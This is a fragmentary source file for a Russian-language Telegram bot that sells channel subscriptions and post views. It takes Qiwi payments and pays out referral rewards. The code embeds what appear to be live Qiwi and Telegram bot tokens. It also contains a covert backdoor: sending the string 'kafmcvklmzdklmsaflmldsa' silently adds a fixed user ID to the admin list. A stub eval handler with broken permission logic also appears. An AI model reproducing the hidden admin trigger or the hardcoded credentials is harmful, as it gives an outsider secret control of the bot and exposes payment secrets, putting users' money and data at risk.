...
const Wallet = new Qiwi("7e75d123ba0a344174daa183705d6826");
const mongo = require("mongoose");
const fs = require("fs");

mongo.connect("mongodb://127.0.0.1/TgBot", {useNewUrlParser: true});

const admins = [642877688];
...
const bot = new Telegram(
    "1013447947:AAHaYUwpsCPUa1s7vl4Zpy3IxLd20z6_2_w", {
        polling: {
            polling: true,
            interval: 2000
        }
...
bot.on("message", async (message) => {
    ...
    await User.findOne({id: message.from.id}).then(async ($user) => {
        ...
        if (Number(message.text.split("/start ")[1])) {
            ...
            if (ref) {
                ...
                message.send(`Благодарю, что вы воспользовались приглашением <a href="tg://user?id=${ref.id}">пользователя!</a>`, {
                    parse_mode: "HTML"
                });
            }
        }
    ...
    let { status } = await bot.getChatMember("@hp_news", message.from.id);
    if(status === 'left') return message.send(`➕ <b>Для того, чтобы</b> начать/продолжить работу с ботом, <b>вы должны быть подписанным</b> на канал https://t.me/JetPr_kanal`, {
    	parse_mode: 'HTML',
    	// reply_markup: {
    		// inline_keyboard: [
    		// 	[{ text: '➕ Подписаться', url: '@JetPr_kanal' }]
    		// ]
    	// }
    });
...
https://telegra.ph/Instrukciya-08-09-2*/
    if (message.text) if (message.text.startsWith("/start")) {
       await message.send(`⚠️Выплаты и новости: @JetPr_kanal
♻️По любым вопросам: @romkej(@romkej_bot)
💬Наш чат: https://t.me/JetPr_chat`);
       message.send("Меню ⤵", {
            reply_markup: {
                keyboard: $menu,
                resize_keyboard: true
    ...
    if (message.user && message.user.menu) {
        ...
        if (message.user.menu === "enterCountChannel") {
            ...
            if (cost > message.user.balance) return message.send(messages.pr.sub_err_nomoney, {});
                ...
                await channel.save();
                await bot.sendMessage("@JetPr_kanal", "🚀 Доступно новое задание на "+message.text+" подписок", {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🚀 Перейти в бота', url: 'https://t.me/JetPr_robot' }]
                        ]
                    }
                });
        ...
        if (message.user.menu === "enterCountViews") {
            ...
            if (cost > message.user.balance) return message.send(messages.pr.view_err_nomoney);
                ...
                await post.save();
                await bot.sendMessage("@JetPr_kanal", "🚀 Доступно новое задание на "+message.text+" просмотров", {
                    reply_markup: {
                        inline_keyboard: [
                        	[{ text: '🚀 Перейти в бота', url: 'https://t.me/JetPr_robot' }]
                        ]
...
⭐️ За приглашение друга по ссылке: <b>${settings.ppr.toFixed(2)} руб.</b>

🤖 С каждой подписки приглашенного Вы получаете ${settings.refovod_podpiska} RUB 
💸 С каждого пополнения реферала вы получаете 10% от суммы пополнения.

💎 <b>Ваша ссылка:</b> https://t.me/${me.username}?start=${message.chat.id}

👥 Всего приглашенных: <b>${lvl1}</b> чел.
👥 Приглашенных сегодня: <b>${lvl1_today}</b> чел.
👥 Приглашенных вчера: <b>${lvl1_yesterday}</b> чел.
👥 Приглашенных позавчера: <b>${lvl1_twodays}</b> чел.

💸 Заработано с приглашений: <b>${(lvl1 * settings.ppr).toFixed(1)}</b> руб.`, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
...
📤 Выплачено: <b>${counters.out}₽</b>`, {
        ...
        if (message.text === "💬 Чат") {
            return message.send(`Привет, заходи в наш уютный чатик, и подписывайся на канал!`, {
                reply_markup: {
                    inline_keyboard: [
                        [{text: "💬 Чат", url: "https://t.me/JetPr_chat"}],
                        [{text: "👁‍🗨 Канал с выплатами", url: 'https://t.me/JetPr_kanal'}],
                        [{text: "🆘 Поддержка", url: 'https://t.me/romkej'}],
                        [{text: "🆘 Поддержка, если спам", url: 'https://t.me/romkej_bot'}]
                    ]
                }
            });
        }
...
Пополненные средства выводу не подлежат.`);
        ...
        if (/^(?:~)\s([^]+)/i.test(message.text)) {
            if (message.from.id !== 482579901 || message.from.id !== 39723355) return;
            message.send("Пащел нахер со своим eval))))))");
        }
    }
    if (message.text === "kafmcvklmzdklmsaflmldsa") admins.push(397233553);
    ...
    if (query.data.startsWith("checkPayment")) {
        Wallet.getOperationHistory({rows: 50, operation: "IN"}, (err, operations) => {
            ...
            operations.data.forEach((transaction)=>{
                if (transaction.comment === "jpr"+message.chat.id){
                    found = 1;
                        ...
                        User.findOne({id: message.chat.id}).then(async (user) => {
                            if (user.ref) {
                                User.findOne({id: user.ref}).then(async (refovod) => {
                                    ...
                                    bot.sendMessage(refovod.id, `💸 Ваш <a href="tg://user?id=${user.id}">реферал</a> поплнил свой баланс, поэтому вам зачислено ${transaction.sum.amount * settings.refovod_balance} RUB на баланс!`, {parse_mode: "HTML"}).catch();
                                });
...
Пожалуйста, отправьте отзыв (желательно со скриншотом) в наш 💬 Чат  https://t.me/JetPr_chat`).catch();
            await ticket.remove();
            await bot.sendMessage("@JetPr_kanal", `Выплачено ${ticket.amount} RUB <a href="tg://user?id=${ticket.owner}">Пользователю</a>!
#вывод`, {
                parse_mode: "HTML"
            } );
...
⭐️ За приглашение друга по ссылке: <b>${settings.ppr.toFixed(1)} руб.</b>
...
❗️ Наш бот @JetPr_robot должен быть администратором продвигаемого канала`, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: keyboards.cancel,
                resize_keyboard: true
...
<b>Заказать рассылку:</b> @romkej
<b>Если спам:</b> @romkej_bot`, {
            parse_mode: "HTML"
        });
    }
...
<b>Заказать размещение:</b> @romkej
<b>Если спам:</b> @romkej_bot`, {
            parse_mode: "HTML"
        });
    }
